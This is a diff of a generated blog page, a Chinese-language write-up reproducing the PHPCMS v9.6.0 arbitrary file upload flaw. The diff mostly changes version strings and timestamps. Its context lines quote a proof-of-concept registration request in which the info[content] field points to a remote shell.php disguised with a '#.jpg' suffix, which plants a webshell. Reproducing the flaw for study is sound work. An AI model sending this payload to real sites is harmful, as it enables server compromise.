@@ -93,22 +93,22 @@
   };
 </script>
 
-  <meta name="description" content="前言phpcmsv9ubuntu19mysql+php5.6 写在前面这两天在家里，状态特别不好，因为家里的网速差，上个网都慢的要死，所以整的我整个人都十分的郁闷然后提前溜回学校吧，还是实验室好啊，今天尝试复现phpcmsv9.6中的任意文件上传漏洞，在复现的过程中，看完POC后，自己尝试寻找触发点，其间意识到debug的重要性，然后差不多一个下午都在试着使用debug，然后绕了不少弯路，现在还在">
+  <meta name="description" content="前言phpcmsv9.6.0ubuntu19mysql+php5.6 写在前面这两天在家里，状态特别不好，因为家里的网速差，上个网都慢的要死，所以整的我整个人都十分的郁闷然后提前溜回学校吧，还是实验室好啊，今天尝试复现phpcmsv9.6中的任意文件上传漏洞，在复现的过程中，看完POC后，自己尝试寻找触发点，其间意识到debug的重要性，然后差不多一个下午都在试着使用debug，然后绕了不少弯路，">
 <meta name="keywords" content="root">
 <meta property="og:type" content="article">
 <meta property="og:title" content="phpcmsv9文件上传漏洞[复现]">
 <meta property="og:url" content="http://yoursite.com/2019/07/19/phpcmsv9文件上传漏洞-复现/index.html">
 <meta property="og:site_name" content="The clown is laughing at you">
-<meta property="og:description" content="前言phpcmsv9ubuntu19mysql+php5.6 写在前面这两天在家里，状态特别不好，因为家里的网速差，上个网都慢的要死，所以整的我整个人都十分的郁闷然后提前溜回学校吧，还是实验室好啊，今天尝试复现phpcmsv9.6中的任意文件上传漏洞，在复现的过程中，看完POC后，自己尝试寻找触发点，其间意识到debug的重要性，然后差不多一个下午都在试着使用debug，然后绕了不少弯路，现在还在">
+<meta property="og:description" content="前言phpcmsv9.6.0ubuntu19mysql+php5.6 写在前面这两天在家里，状态特别不好，因为家里的网速差，上个网都慢的要死，所以整的我整个人都十分的郁闷然后提前溜回学校吧，还是实验室好啊，今天尝试复现phpcmsv9.6中的任意文件上传漏洞，在复现的过程中，看完POC后，自己尝试寻找触发点，其间意识到debug的重要性，然后差不多一个下午都在试着使用debug，然后绕了不少弯路，">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://yoursite.com/2019/07/19/phpcmsv9文件上传漏洞-复现/1.png">
 <meta property="og:image" content="http://yoursite.com/2019/07/19/phpcmsv9文件上传漏洞-复现/2.png">
 <meta property="og:image" content="http://yoursite.com/2019/07/19/phpcmsv9文件上传漏洞-复现/4.png">
 <meta property="og:image" content="http://yoursite.com/2019/07/19/phpcmsv9文件上传漏洞-复现/5.png">
-<meta property="og:updated_time" content="2019-07-20T08:18:12.568Z">
+<meta property="og:updated_time" content="2019-07-20T11:52:18.495Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="phpcmsv9文件上传漏洞[复现]">
-<meta name="twitter:description" content="前言phpcmsv9ubuntu19mysql+php5.6 写在前面这两天在家里，状态特别不好，因为家里的网速差，上个网都慢的要死，所以整的我整个人都十分的郁闷然后提前溜回学校吧，还是实验室好啊，今天尝试复现phpcmsv9.6中的任意文件上传漏洞，在复现的过程中，看完POC后，自己尝试寻找触发点，其间意识到debug的重要性，然后差不多一个下午都在试着使用debug，然后绕了不少弯路，现在还在">
+<meta name="twitter:description" content="前言phpcmsv9.6.0ubuntu19mysql+php5.6 写在前面这两天在家里，状态特别不好，因为家里的网速差，上个网都慢的要死，所以整的我整个人都十分的郁闷然后提前溜回学校吧，还是实验室好啊，今天尝试复现phpcmsv9.6中的任意文件上传漏洞，在复现的过程中，看完POC后，自己尝试寻找触发点，其间意识到debug的重要性，然后差不多一个下午都在试着使用debug，然后绕了不少弯路，">
 <meta name="twitter:image" content="http://yoursite.com/2019/07/19/phpcmsv9文件上传漏洞-复现/1.png">
 
 
@@ -345,7 +345,7 @@
                 
                   <span class="post-meta-item-text">Bearbeitet am</span>
                 
-                <time title="Geändert am: 2019-07-20 16:18:12" itemprop="dateModified" datetime="2019-07-20T16:18:12+08:00">2019-07-20</time>
+                <time title="Geändert am: 2019-07-20 19:52:18" itemprop="dateModified" datetime="2019-07-20T19:52:18+08:00">2019-07-20</time>
               </span>
             
           
@@ -384,7 +384,7 @@
       
 
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpcmsv9<br>ubuntu19<br>mysql+php5.6</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpcmsv9.6.0<br>ubuntu19<br>mysql+php5.6</p>
 <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这两天在家里，状态特别不好，因为家里的网速差，上个网都慢的要死，所以整的我整个人都十分的郁闷<br>然后提前溜回学校吧，还是实验室好啊，今天尝试复现phpcmsv9.6中的任意文件上传漏洞，在复现的过程中，看完POC后，自己尝试寻找触发点，其间意识到debug的重要性，然后差不多一个下午都在试着使用debug，然后绕了不少弯路，现在还在学习使用，这次的复现，debug起到至关重要的作用。<br>然后有一个要命的地方，函数的操作和数据库之间的联系，我发现我没有很好的联系在一起。</p>
 <h1 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h1><p>由于过滤的不当，使得文件可以绕过后缀限制，实现文件上传。</p>
 <h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="触发点追溯"><a href="#触发点追溯" class="headerlink" title="触发点追溯"></a>触发点追溯</h2><p>路由就不介绍了…..<br>看过POC，其中payload为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?m=member&amp;c=index&amp;a=register&amp;siteid=<span class="number">1</span></span><br><span class="line">POST:siteid=<span class="number">1</span>&amp;modelid=<span class="number">11</span>&amp;username=<span class="number">123456</span>&amp;password=<span class="number">123456</span>&amp;email=<span class="number">123456</span>@qq.com&amp;info[content]=&lt;img src=http:<span class="comment">//127.0.0.1/shell.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span></span><br></pre></td></tr></table></figure></p>
